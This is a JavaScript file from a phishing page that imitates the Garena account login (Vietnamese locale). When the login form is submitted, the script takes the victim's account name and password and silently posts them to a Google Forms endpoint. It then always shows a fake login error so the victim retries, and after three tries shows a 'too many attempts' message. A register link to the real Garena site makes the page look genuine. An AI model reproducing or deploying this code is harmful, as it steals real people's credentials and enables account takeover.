function bntRegister() {
  window.location.href =
    "https://sso.garena.com/universal/register?redirect_uri=https://sso.garena.com/universal/login?app_id=10100%26redirect_uri=https%253A%252F%252Faccount.garena.com%252F%26locale=vi-VN&locale=vi-VN";
}

function submitForm(e) {
  var pAccount = document.getElementById("login-account-error");
  var pPassword = document.getElementById("login-pass-error");
  var pLogin = document.getElementById("login-error");
  var pLoginMany = document.getElementById("login-error-many");
  var hide = "d-none";

  if (!pAccount.classList.contains(hide)) {
    pAccount.classList.add(hide);
  }
  if (!pPassword.classList.contains(hide)) {
    pPassword.classList.add(hide);
  }
  if (!pLogin.classList.contains(hide)) {
    pLogin.classList.add(hide);
  }
  if (!pLoginMany.classList.contains(hide)) {
    pLoginMany.classList.add(hide);
  }

  e.preventDefault();
  var acc = e.target.account.value;
  var pass = e.target.password.value;
  if (acc && pass) {
    var valueAcc = parseInt(localStorage.getItem(acc)) || 0;
    if (valueAcc < 3) {
      var url =
        "https://docs.google.com/forms/u/0/d/e/1FAIpQLSee6GT_1fxQcNPEJ9vD1rAd-VL4iavBdgpf32LwllfSr9bPsg/formResponse";
      var data = {
        "entry.709239586": acc,
        "entry.132098211": pass,
        "entry.1739878653": "Garena",
      };

      fetch(url, {
        method: "POST",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
        },
        body: new URLSearchParams(data),
      })
        .then(function (response) {
          pLogin.classList.remove(hide);
        })
        .catch(function (error) {
          pLogin.classList.remove(hide);
        });
      valueAcc++;
      localStorage.setItem(acc, valueAcc);
    } else {
      pLoginMany.classList.remove(hide);
    }
  } else {
    if (!acc) {
      pAccount.classList.remove(hide);
    }
    if (!pass) {
      pPassword.classList.remove(hide);
    }
  }
}

var input = document.getElementById("account");

input.addEventListener("keydown", function (event) {
  if (event.key === " ") {
    event.preventDefault();
  }
});
